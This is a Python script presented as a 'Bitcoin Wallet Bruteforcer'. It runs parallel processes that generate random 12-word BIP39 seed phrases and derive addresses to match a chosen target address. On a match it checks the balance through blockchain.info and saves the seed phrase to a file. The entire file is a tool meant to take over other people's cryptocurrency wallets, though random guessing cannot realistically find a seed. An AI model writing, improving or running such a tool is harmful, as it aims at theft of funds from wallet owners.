import os
import requests
import logging
import time
from dotenv import load_dotenv
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
from multiprocessing import Process
import ctypes
import argparse

LOG_FILE_NAME = "bruteforce.log"
WALLETS_FILE_NAME = "wallets_with_balance.txt"

def set_window_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)

directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(directory, LOG_FILE_NAME)
wallets_file_path = os.path.join(directory, WALLETS_FILE_NAME)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler(log_file_path),
        logging.StreamHandler(),
    ],
)

def bip44_BTC_seed_to_address(seed):
    seed_bytes = Bip39SeedGenerator(seed).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()

def check_BTC_balance(address, retries=3, delay=5):
    for attempt in range(retries):
        try:
            response = requests.get(f"https://blockchain.info/balance?active={address}")
            data = response.json()
            balance = data[address]["final_balance"]
            return balance / 100000000
        except Exception as e:
            if attempt < retries - 1:
                logging.error(
                    f"Error checking balance, retrying in {delay} seconds: {str(e)}"
                )
                time.sleep(delay)
            else:
                logging.error("Error checking balance: %s", str(e))
                return 0

def write_to_file(seed, BTC_address, BTC_balance):
    with open(wallets_file_path, "a") as f:
        log_message = f"Seed: {seed}\nAddress: {BTC_address}\nBalance: {BTC_balance} BTC\n\n"
        f.write(log_message)
        logging.info(f"Written to file: {log_message}")

def bruteforce_instance(target_address):
    attempts = 0
    phrases_tried = 0
    tried_seeds = set()

    while True:
        seed = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)

        if seed in tried_seeds:
            continue

        tried_seeds.add(seed)

        BTC_address = bip44_BTC_seed_to_address(seed)
        attempts += 1
        phrases_tried += 1

        progress = f"\rAttempt {attempts}: Trying mnemonic {seed}    \r"
        print(progress, end='', flush=True)

        set_window_title(f"Bread Forcer, Seeds Attempted: {phrases_tried}")

        if BTC_address == target_address:
            print("\033[2K", end='')
            print("\r", end='')
            logging.info(f"Mnemonic found! Seed: {seed}")
            BTC_balance = check_BTC_balance(BTC_address)
            if BTC_balance > 0:
                logging.info("(!) Wallet with balance found!")
                write_to_file(seed, BTC_address, BTC_balance)
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Bitcoin Wallet Bruteforcer')
    parser.add_argument('-a', '--address', type=str, help='Target Bitcoin address', required=True)
    parser.add_argument('-i', '--instances', type=int, help='Number of instances to run', required=True)
    args = parser.parse_args()

    target_address = args.address
    num_instances = args.instances

    instances = []
    for _ in range(num_instances):
        instance = Process(target=bruteforce_instance, args=(target_address,))
        instance.start()
        instances.append(instance)

    for instance in instances:
        instance.join()
